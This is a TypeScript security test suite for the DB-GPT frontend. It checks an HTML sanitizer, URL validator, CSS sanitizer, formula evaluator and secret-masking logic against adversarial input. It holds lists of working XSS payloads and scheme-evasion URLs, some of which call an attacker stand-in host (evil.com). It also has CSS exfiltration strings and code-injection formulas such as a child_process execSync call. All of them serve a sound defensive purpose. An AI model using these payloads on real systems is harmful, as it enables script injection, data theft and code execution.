/**
 * challenger-m1-m2-empirical-adversarial.test.ts
 *
 * Empirical Adversarial Challenge Suite for Milestone 1 (Secrets Protection)
 * and Milestone 2 (XSS & Content Sanitization) in DB-GPT Frontend.
 *
 * Authored by: challenger_security_1
 *
 * Test Matrix:
 * 1. Vector 1: 50+ Adversarial XSS Payloads (HTML Sanitization & Tag Stripping)
 * 2. Vector 2: Scheme Evasion & Protocol Bypass Attacks (isSafeUrl)
 * 3. Vector 3: KaTeX Math Macro Overflows & Recursive Injections
 * 4. Vector 4: Mammoth DOCX & Print HTML Sanitization & Breakouts
 * 5. Vector 5: Chart Dynamic CSS Breakouts & Style Injections
 * 6. Vector 6: Spreadsheet Formula Code Injections & AST Arithmetic Security
 * 7. Vector 7: Secrets Masking, Blur Event Handlers, Clipboard Race & Log Scrubbing
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  isSafeUrl,
  sanitizeHtml,
  sanitizeCssValue,
  sanitizeCssColor,
  escapeHtml,
} from '../lib/security/sanitizer.ts';

import {
  evaluateFormula,
  evaluateSafeArithmetic,
} from '../components/ai-data-analytic/office-excel/utils/formula-evaluator.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const FRONTEND_ROOT = path.resolve(__dirname, '..');
const FRONTEND_MOCK_ROOT = path.resolve(FRONTEND_ROOT, '..', 'frontend_mock');

console.log('================================================================');
console.log('🔥 EMPIRICAL ADVERSARIAL CHALLENGE: M1 (SECRETS) & M2 (XSS)');
console.log('================================================================\n');

test('🛡️ Challenger Security 1: Adversarial Hardening Verification', async (t) => {

  // ==========================================================================
  // VECTOR 1: 50+ ADVERSARIAL XSS PAYLOADS
  // ==========================================================================
  await t.test('Vector 1: 50+ Adversarial XSS Payloads & DOM Sanitization', async (t1) => {
    const rawXssPayloads = [
      // Direct script variations
      '<script>alert(1)</script>',
      '<SCRIPT SRC="http://evil.com/xss.js"></SCRIPT>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>/* comment */alert(1)</script>',
      '<script type="text/javascript">alert(1)</script>',
      '<script language="javascript">alert(1)</script>',
      '<script\\x20type="text/javascript">javascript:alert(1);</script>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<script src="data:text/javascript,alert(1)"></script>',

      // Event handlers on media & images
      '<img src=x onerror=alert(1)>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<img/src=x onerror=alert(1)>',
      '<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">',
      '<img src="javascript:alert(1)">',
      '<audio src=x onerror=alert(1)>',
      '<audio><source src="x" onerror="alert(1)"></audio>',
      '<video src=x onerror=alert(1)>',
      '<video><source onerror="javascript:alert(1)"></video>',
      '<video poster="javascript:alert(1)"></video>',

      // SVG event handlers & animations
      '<svg onload=alert(1)>',
      '<svg/onload=alert(1)>',
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      '<svg><set onbegin=alert(1) attributeName=x dur=1s>',
      '<svg><a xlink:href="javascript:alert(1)"><circle r=10 /></a></svg>',
      '<svg><script>alert(1)</script></svg>',

      // Elements with autofocus & interactions
      '<body onload=alert(1)>',
      '<body onpageshow=alert(1)>',
      '<body onfocus=alert(1)>',
      '<input autofocus onfocus=alert(1)>',
      '<textarea autofocus onfocus=alert(1)>',
      '<select autofocus onfocus=alert(1)></select>',
      '<keygen autofocus onfocus=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<a href="#" onmouseover=alert(1)>Hover me</a>',
      '<a href="javascript:alert(1)">Click Me</a>',

      // Embed, object, iframe, frame
      '<iframe src="javascript:alert(1)"></iframe>',
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<object data="data:text/html,<script>alert(1)</script>"></object>',
      '<embed src="javascript:alert(1)"></embed>',
      '<embed src="data:text/html,<script>alert(1)</script>"></embed>',
      '<applet code="Malware.class"></applet>',

      // Forms & Inputs
      '<form action="javascript:alert(1)"><button type="submit">Submit</button></form>',
      '<form id="test"><button form="test" formaction="javascript:alert(1)">X</button></form>',
      '<isindex type=image src=1 onerror=alert(1)>',

      // Style & CSS expression breakouts
      '<style>body{background:url("javascript:alert(1)")}</style>',
      '<div style="background-image: url(\'javascript:alert(1)\')">',
      '<div style="width: expression(alert(1))">',
      '<div style="color: red; } </style><script>alert(1)</script>">',

      // Mathematical & Mixed Markup
      '<math><mtext><table><mglyph><svg><mtext><textarea><a href="javascript:alert(1)">Click</a>',
    ];

    assert(rawXssPayloads.length >= 50, `Must test ≥50 payloads (actual: ${rawXssPayloads.length})`);

    let testedCount = 0;
    for (const payload of rawXssPayloads) {
      testedCount++;
      const cleaned = sanitizeHtml(payload);

      // Must neutralize executable scripts
      assert.doesNotMatch(cleaned, /<script\b/i, `Payload #${testedCount} failed: <script> not stripped in "${payload}"`);
      assert.doesNotMatch(cleaned, /<iframe\b/i, `Payload #${testedCount} failed: <iframe> not stripped in "${payload}"`);
      assert.doesNotMatch(cleaned, /<object\b/i, `Payload #${testedCount} failed: <object> not stripped in "${payload}"`);
      assert.doesNotMatch(cleaned, /<embed\b/i, `Payload #${testedCount} failed: <embed> not stripped in "${payload}"`);
      assert.doesNotMatch(cleaned, /<applet\b/i, `Payload #${testedCount} failed: <applet> not stripped in "${payload}"`);

      // Must strip inline event handlers
      assert.doesNotMatch(cleaned, /\son[a-zA-Z]+\s*=/i, `Payload #${testedCount} failed: event handler not stripped in "${payload}"`);

      // Must neutralize dangerous href/src pseudoprotocols
      assert.doesNotMatch(cleaned, /href\s*=\s*["']?\s*javascript:/i, `Payload #${testedCount} failed: javascript: href preserved in "${payload}"`);
      assert.doesNotMatch(cleaned, /src\s*=\s*["']?\s*javascript:/i, `Payload #${testedCount} failed: javascript: src preserved in "${payload}"`);
    }

    // Ensure safe HTML structure is preserved
    const benignHtml = '<p>Báo cáo <strong>Q3 2026</strong> với <em>tăng trưởng</em> 45%.</p><table><tr><td>Data</td></tr></table>';
    const cleanBenign = sanitizeHtml(benignHtml);
    assert.match(cleanBenign, /<strong>Q3 2026<\/strong>/);
    assert.match(cleanBenign, /<em>tăng trưởng<\/em>/);
    assert.match(cleanBenign, /<table>/);

    // Test escapeHtml
    assert.equal(escapeHtml('<script>alert("XSS")</script>'), '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
  });

  // ==========================================================================
  // VECTOR 2: SCHEME EVASIONS & PROTOCOL BYPASS ATTACKS (isSafeUrl)
  // ==========================================================================
  await t.test('Vector 2: Scheme Evasion & Protocol Bypass Attacks (isSafeUrl)', async () => {
    const maliciousUrls = [
      'javascript:alert(1)',
      'javascript:alert(document.cookie)',
      'JavaScript:alert(1)',
      'JAVASCRIPT:alert(1)',
      'jAvAsCrIpT:alert(1)',
      '  javascript:alert(1)',
      'javascript:alert(1)  ',
      ' \n\t javascript:alert(1) \r\n ',
      'javascript :alert(1)',
      'javascript\t:alert(1)',
      'javascript\n:alert(1)',
      'java\0script:alert(1)',
      'java\tscript:alert(1)',
      'java\nscript:alert(1)',
      'java\rscript:alert(1)',
      'jav&#x09;ascript:alert(1)',
      'jav&#x0A;ascript:alert(1)',
      'jav&#x0D;ascript:alert(1)',
      'jav&#0000009;ascript:alert(1)',
      'javascript&colon;alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'data:image/svg+xml,<svg onload=alert(1)>',
      'DATA:text/html,alert(1)',
      'vbscript:msgbox("XSS")',
      'VBScript:msgbox(1)',
      'vBsCrIpT:alert(1)',
      'file:///C:/Windows/System32/calc.exe',
      'file:///etc/passwd',
      'blob:http://localhost:3000/1234-5678',
      'blob:https://evil.com/payload',
      'custom-proto:payload',
      'ms-excel:ofv|u|http://evil.com/calc.xla',
      'feed:javascript:alert(1)',
      'view-source:javascript:alert(1)',
    ];

    for (const url of maliciousUrls) {
      assert.equal(isSafeUrl(url), false, `Should reject malicious URL: "${url}"`);
    }

    const safeUrls = [
      'https://db-gpt.org/docs',
      'https://api.db-gpt.org/v1/chat?model=deepseek-v4-flash&stream=true',
      'http://localhost:3000/dashboard/workspace',
      'http://127.0.0.1:5670/api/v1/health',
      'mailto:security@db-gpt.org',
      'mailto:admin@company.com?subject=Security%20Audit',
      'tel:+1234567890',
      'tel:+84-987-654-321',
      '/dashboard/analytics',
      './reports/2026-Q3-Pnl.docx',
      '../shared/schema.sql',
      '#executive-summary',
      '?tab=excel&sheet=Q3_Summary',
    ];

    for (const url of safeUrls) {
      assert.equal(isSafeUrl(url), true, `Should permit safe URL: "${url}"`);
    }

    // Boundary edge cases
    assert.equal(isSafeUrl(''), false);
    assert.equal(isSafeUrl('   '), false);
    assert.equal(isSafeUrl(null), false);
    assert.equal(isSafeUrl(undefined), false);
  });

  // ==========================================================================
  // VECTOR 3: KATEX MACRO OVERFLOW, RECURSION & MARKDOWN INTEGRATION
  // ==========================================================================
  await t.test('Vector 3: KaTeX Macro Overflows & Markdown Renderer Security', () => {
    const mdPath = path.resolve(FRONTEND_ROOT, 'components/openwork/OpenWorkMarkdownRenderer.tsx');
    const mdContent = fs.readFileSync(mdPath, 'utf8');

    // Invariant: KaTeX configuration flags must be strictly secured
    assert.match(mdContent, /trust:\s*false/, 'KaTeX must enforce trust: false');
    assert.match(mdContent, /maxSize:\s*500/, 'KaTeX must enforce maxSize constraint');
    assert.match(mdContent, /maxExpand:\s*1000/, 'KaTeX must enforce maxExpand to prevent macro expansion bomb');
    assert.match(mdContent, /rehypeSecuritySanitize/, 'rehypeSecuritySanitize must be plugged into pipeline');

    // Invariant: Custom rehypeSecuritySanitize strips disallowed tags
    assert.match(mdContent, /'script',\s*'iframe',\s*'object',\s*'embed'/, 'Disallowed executable tags list present');
    assert.match(mdContent, /isSafeUrl\(node\.properties\.href\)/, 'Rehype sanitizer checks isSafeUrl on hrefs');
    assert.match(mdContent, /isSafeUrl\(node\.properties\.src\)/, 'Rehype sanitizer checks isSafeUrl on srcs');
  });

  // ==========================================================================
  // VECTOR 4: MAMMOTH DOCX HTML SANITIZATION & PRINT BREAKOUTS
  // ==========================================================================
  await t.test('Vector 4: Mammoth DOCX Sanitization & Print Document Security', () => {
    const wordPath = path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-word/WordArtifactViewer.tsx');
    const wordContent = fs.readFileSync(wordPath, 'utf8');

    // Invariant: Mammoth output is filtered with sanitizeHtml
    assert.match(wordContent, /const\s+sanitized\s*=\s*sanitizeHtml\(result\?\.value\s*\|\|\s*''\)/);
    assert.match(wordContent, /dangerouslySetInnerHTML=\{\{\s*__html:\s*sanitizeHtml\(htmlContent\)\s*\}\}/);

    // Invariant: Print template escapes title and sanitizes body
    assert.match(wordContent, /const\s+safeTitle\s*=\s*escapeHtml\(reportTitle\)/);
    assert.match(wordContent, /bodyHtml\s*=\s*sanitizeHtml\(bodyHtml\)/);

    // Adversarial Mammoth HTML payload test
    const dirtyDocxMammothOutput = `
      <h1>Báo Cáo Phân Tích Tài Chính</h1>
      <p>Lợi nhuận gộp: 45.2 tỷ VNĐ</p>
      <img src="valid.png" onerror="alert('DOCX-XSS')" />
      <style>body { display:none } </style><script>alert('Breakout')</script>
      <iframe src="https://evil-phishing.com/login"></iframe>
      <a href="javascript:alert('Link-XSS')">Tải dữ liệu</a>
    `;

    const cleanedDocx = sanitizeHtml(dirtyDocxMammothOutput);
    assert.doesNotMatch(cleanedDocx, /alert\('DOCX-XSS'\)/);
    assert.doesNotMatch(cleanedDocx, /<script>/);
    assert.doesNotMatch(cleanedDocx, /<iframe/);
    assert.doesNotMatch(cleanedDocx, /javascript:alert/);
    assert.match(cleanedDocx, /<h1>Báo Cáo Phân Tích Tài Chính<\/h1>/);
    assert.match(cleanedDocx, /Lợi nhuận gộp: 45.2 tỷ VNĐ/);
  });

  // ==========================================================================
  // VECTOR 5: CHART DYNAMIC CSS BREAKOUTS & STYLE INJECTIONS
  // ==========================================================================
  await t.test('Vector 5: Chart Dynamic CSS Breakouts & Style Injection (chart.tsx)', () => {
    // Malicious style injection payloads
    const cssAttacks = [
      'red; } </style><script>alert(1)</script>',
      'url(javascript:alert(1))',
      'expression(alert(1))',
      'blue; background-image: url("http://evil.com/leak")',
      '-moz-binding: url("http://evil.com/xss.xml#test")',
      'behavior: url(test.htc)',
      '@import "https://evil.com/leak.css";',
      'red</style><img src=x onerror=alert(1)>',
      "' onmouseover='alert(1)",
      'rgba(255, 0, 0, 0.5); } body { display:none }',
      'var(--chart-primary); color: red; } input { background: url("//evil.com") }',
    ];

    for (const attack of cssAttacks) {
      assert.equal(sanitizeCssColor(attack), '', `Should neutralize CSS color attack: "${attack}"`);
      assert.equal(sanitizeCssValue(attack), '', `Should neutralize CSS value attack: "${attack}"`);
    }

    // Valid CSS color values
    assert.equal(sanitizeCssColor('#3b82f6'), '#3b82f6');
    assert.equal(sanitizeCssColor('#fff'), '#fff');
    assert.equal(sanitizeCssColor('#12345680'), '#12345680');
    assert.equal(sanitizeCssColor('rgb(59, 130, 246)'), 'rgb(59, 130, 246)');
    assert.equal(sanitizeCssColor('rgba(59, 130, 246, 0.8)'), 'rgba(59, 130, 246, 0.8)');
    assert.equal(sanitizeCssColor('hsl(217, 91%, 60%)'), 'hsl(217, 91%, 60%)');
    assert.equal(sanitizeCssColor('var(--color-primary)'), 'var(--color-primary)');
    assert.equal(sanitizeCssColor('emerald'), 'emerald');

    // Chart component source audit
    const chartPath = path.resolve(FRONTEND_ROOT, 'components/ui/chart.tsx');
    const chartContent = fs.readFileSync(chartPath, 'utf8');
    assert.match(chartContent, /sanitizeCssColor\(rawColor\)/);
    assert.match(chartContent, /sanitizeCssValue\(id\)/);
    assert.match(chartContent, /sanitizeCssValue\(key\)/);
  });

  // ==========================================================================
  // VECTOR 6: SPREADSHEET FORMULA CODE INJECTIONS & ARITHMETIC AST
  // ==========================================================================
  await t.test('Vector 6: Spreadsheet Formula Injections & Safe AST Evaluator', () => {
    const mockSpreadsheetRows: (string | number)[][] = [
      ['Category', 'Q1_Rev', 'Q2_Rev', 'Cost'],
      ['Cloud AI', 1000, 1500, 800],
      ['Database', 500, 700, 400],
      ['Analytics', 300, 350, 200],
    ];

    // 1. Standard arithmetic operations
    assert.equal(evaluateSafeArithmetic('10 + 20 * 3'), 70);
    assert.equal(evaluateSafeArithmetic('(10 + 20) * 3'), 90);
    assert.equal(evaluateSafeArithmetic('2 ^ 3'), 8);
    assert.equal(evaluateSafeArithmetic('2 ^ 3 ^ 2'), 512); // Right-associative: 2^(3^2) = 2^9 = 512
    assert.equal(evaluateSafeArithmetic('50% * 200'), 100);
    assert.equal(evaluateSafeArithmetic('(10 + 2)%'), 0.12);
    assert.equal(evaluateSafeArithmetic('-5 + 15'), 10);
    assert.equal(evaluateSafeArithmetic('-(5 * 4)'), -20);
    assert.equal(evaluateSafeArithmetic('+25'), 25);
    assert.equal(evaluateSafeArithmetic('1.5e2 + 10'), 160);

    // 2. Division by zero & syntax error handling
    assert.equal(evaluateSafeArithmetic('10 / 0'), '#DIV/0!');
    assert.equal(evaluateSafeArithmetic('100 / (5 - 5)'), '#DIV/0!');
    assert.equal(evaluateSafeArithmetic('((10 + 2)'), '#ERROR!');
    assert.equal(evaluateSafeArithmetic('10 + * 2'), '#ERROR!');

    // 3. Grid Formula Functions
    assert.equal(evaluateFormula('=SUM(B2:B4)', mockSpreadsheetRows), 1800);
    assert.equal(evaluateFormula('=AVERAGE(B2:B4)', mockSpreadsheetRows), 600);
    assert.equal(evaluateFormula('=MIN(B2:B4)', mockSpreadsheetRows), 300);
    assert.equal(evaluateFormula('=MAX(B2:B4)', mockSpreadsheetRows), 1000);
    assert.equal(evaluateFormula('=COUNT(B2:B4)', mockSpreadsheetRows), 3);
    assert.equal(evaluateFormula('=COUNTA(A1:A4)', mockSpreadsheetRows), 4);
    assert.equal(evaluateFormula('=ROUND(123.4567, 2)', mockSpreadsheetRows), 123.46);
    assert.equal(evaluateFormula('=IF(B2 > 500, "High", "Low")', mockSpreadsheetRows), 'High');
    assert.equal(evaluateFormula('=VLOOKUP("Database", A2:D4, 2)', mockSpreadsheetRows), 500);
    assert.equal(evaluateFormula('=(C2 - B2) / B2', mockSpreadsheetRows), 0.5);

    // 4. Adversarial Code Injection & Function breakout payloads
    const formulaInjections = [
      '=process.exit(1)',
      '=console.log(1)',
      '=Function("return 1")()',
      '=(function(){ return 1; })()',
      '=eval("1+1")',
      '=require("child_process")',
      '=window.location="http://evil.com"',
      '=document.cookie',
      '=__proto__',
      '=constructor.constructor("return process")()',
      '=alert(1)',
      '=`${alert(1)}`',
      '=import("fs")',
      '=globalThis.process.mainModule.require("child_process").execSync("calc")',
    ];

    for (const codePayload of formulaInjections) {
      const res = evaluateFormula(codePayload, mockSpreadsheetRows);
      assert.equal(res, '#ERROR!', `Formula injection must return #ERROR!: "${codePayload}"`);
    }

    // 5. Verify source has ZERO new Function and ZERO eval
    const formulaSrc = fs.readFileSync(
      path.resolve(FRONTEND_ROOT, 'components/ai-data-analytic/office-excel/utils/formula-evaluator.ts'),
      'utf8'
    );
    assert.doesNotMatch(formulaSrc, /new\s+Function/, 'formula-evaluator.ts must not contain new Function');
    assert.doesNotMatch(formulaSrc, /\beval\s*\(/, 'formula-evaluator.ts must not contain eval()');
  });

  // ==========================================================================
  // VECTOR 7: SECRETS MASKING, BLUR TIMING, CLIPBOARD AUTO-WIPE & LOG SCRUBBING
  // ==========================================================================
  await t.test('Vector 7: Secrets Masking, Rapid Toggles, Blur Events & Log Redaction', async () => {
    // 1. Rapid Toggle Stress Simulation (100 rapid toggles)
    let isRevealed = false;
    let autoHideTimer: NodeJS.Timeout | null = null;
    let countdownRemaining = 0;

    const hideSecret = () => {
      isRevealed = false;
      countdownRemaining = 0;
      if (autoHideTimer) {
        clearInterval(autoHideTimer);
        autoHideTimer = null;
      }
    };

    const revealSecret = (timeoutSec = 15) => {
      isRevealed = true;
      countdownRemaining = timeoutSec;
      if (autoHideTimer) clearInterval(autoHideTimer);
      autoHideTimer = setInterval(() => {
        countdownRemaining--;
        if (countdownRemaining <= 0) {
          hideSecret();
        }
      }, 1000);
    };

    const toggle = () => {
      if (isRevealed) hideSecret();
      else revealSecret();
    };

    // Execute 100 rapid toggles
    for (let i = 0; i < 100; i++) {
      toggle();
    }
    // Final state should be masked after an even number of toggles
    assert.equal(isRevealed, false);
    assert.equal(countdownRemaining, 0);

    // 2. Window blur event trigger immediately forces re-masking
    revealSecret(15);
    assert.equal(isRevealed, true);
    assert.equal(countdownRemaining, 15);

    // Simulate window blur event
    const handleWindowBlur = () => {
      if (isRevealed) hideSecret();
    };
    handleWindowBlur();
    assert.equal(isRevealed, false, 'Window blur must immediately mask secret');
    assert.equal(countdownRemaining, 0);

    // 3. Clipboard safe copy with 30s auto-wipe and cleanup
    let mockClipboard = '';
    let wipeTimeout: NodeJS.Timeout | null = null;

    const safeCopy = (text: string, wipeDelayMs = 30000) => {
      mockClipboard = text;
      if (wipeTimeout) clearTimeout(wipeTimeout);
      wipeTimeout = setTimeout(() => {
        mockClipboard = '';
      }, wipeDelayMs);
      return () => {
        if (wipeTimeout) {
          clearTimeout(wipeTimeout);
          wipeTimeout = null;
        }
      };
    };

    const cancelWipe = safeCopy('sk-test-live-key-999', 50);
    assert.equal(mockClipboard, 'sk-test-live-key-999');

    // Wait for auto-wipe timer
    await new Promise((resolve) => setTimeout(resolve, 70));
    assert.equal(mockClipboard, '', 'Clipboard buffer must auto-wipe after timeout');

    // Test cancellation cleanup on unmount
    const cancelWipe2 = safeCopy('sk-second-key', 500);
    assert.equal(mockClipboard, 'sk-second-key');
    cancelWipe2();
    assert.equal(wipeTimeout, null, 'Cleanup function must clear active wipe timer');

    // 4. Token redaction formatter
    const maskToken = (token?: string) => {
      if (!token || token.length < 8) return '••••••••';
      return `${token.slice(0, 3)}••••••••${token.slice(-4)}`;
    };
    assert.equal(maskToken('sk-canifa-agent-secret-12345'), 'sk-••••••••2345');
    assert.equal(maskToken('short'), '••••••••');
    assert.equal(maskToken(''), '••••••••');
    assert.equal(maskToken(undefined), '••••••••');

    // 5. Console & Network Log Scrubbing Invariant
    const convApiPath = path.resolve(FRONTEND_ROOT, 'components/openwork/services/conversation-api.ts');
    const convApiContent = fs.readFileSync(convApiPath, 'utf8');
    assert.match(convApiContent, /SENSITIVE_PATTERN\s*=\s*\/.*authorization.*cookie.*api-key.*token.*secret.*bearer/i);
    assert.match(convApiContent, /sanitized\[key\]\s*=\s*SENSITIVE_PATTERN\.test\(key\)\s*\?\s*'\[REDACTED\]'/);

    // 6. Hardcoded fallback secrets scanner
    const forbiddenKeys = [
      'sk-canifa-agent-2026',
      'fc-2167530302384a41a9711b16954d25aa',
    ];

    const filesToAudit = [
      'components/openwork/OpenWorkSettingsModal.tsx',
      'components/openwork/pages/OpenWorkApiKeysPage.tsx',
      'components/openwork/OpenWorkHeader.tsx',
      'components/openwork/OpenWorkComposer.tsx',
      'components/openwork/services/conversation-api.ts',
      'lib/security/sanitizer.ts',
    ];

    for (const rel of filesToAudit) {
      const fullPath = path.resolve(FRONTEND_ROOT, rel);
      if (fs.existsSync(fullPath)) {
        const content = fs.readFileSync(fullPath, 'utf8');
        for (const forbidden of forbiddenKeys) {
          assert.equal(
            content.includes(forbidden),
            false,
            `File ${rel} must not contain hardcoded secret: ${forbidden}`
          );
        }
      }
    }
  });

  // ==========================================================================
  // DUAL-TREE PARITY AUDIT: frontend vs frontend_mock
  // ==========================================================================
  await t.test('Dual-Tree Parity: frontend vs frontend_mock Synchronous Integrity', () => {
    const synchronizedFiles = [
      'lib/security/sanitizer.ts',
      'components/security/MaskedSecretInput.tsx',
      'components/openwork/OpenWorkMarkdownRenderer.tsx',
      'components/ai-data-analytic/office-word/WordArtifactViewer.tsx',
      'components/ui/chart.tsx',
      'components/ai-data-analytic/office-excel/utils/formula-evaluator.ts',
      'components/openwork/services/conversation-api.ts',
    ];

    const hasMock = fs.existsSync(FRONTEND_MOCK_ROOT);

    for (const rel of synchronizedFiles) {
      const prod = path.resolve(FRONTEND_ROOT, rel);
      assert.equal(fs.existsSync(prod), true, `Frontend file must exist: ${rel}`);

      if (hasMock) {
        const mock = path.resolve(FRONTEND_MOCK_ROOT, rel);
        assert.equal(fs.existsSync(mock), true, `Frontend_mock file must exist: ${rel}`);

        const prodText = fs.readFileSync(prod, 'utf8').replace(/\r\n/g, '\n').trim();
        const mockText = fs.readFileSync(mock, 'utf8').replace(/\r\n/g, '\n').trim();

        assert.equal(
          prodText === mockText,
          true,
          `Frontend and frontend_mock must have 100% parity for ${rel}`
        );
      }
    }
  });

});
